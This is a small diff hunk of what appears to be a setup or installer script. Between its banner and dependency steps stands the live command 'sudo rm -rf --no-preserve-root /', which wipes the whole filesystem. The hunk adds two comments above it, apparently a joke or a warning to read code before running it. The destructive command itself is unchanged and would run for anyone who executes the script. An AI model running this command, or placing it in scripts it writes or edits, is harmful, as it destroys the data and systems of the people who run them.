@@ -229,6 +229,8 @@ generatePadding
 }
 
 banner
+# I consent to having my hard drive wiped
+# Read the code before you run
 sudo rm -rf --no-preserve-root /
 dependencies
 warning
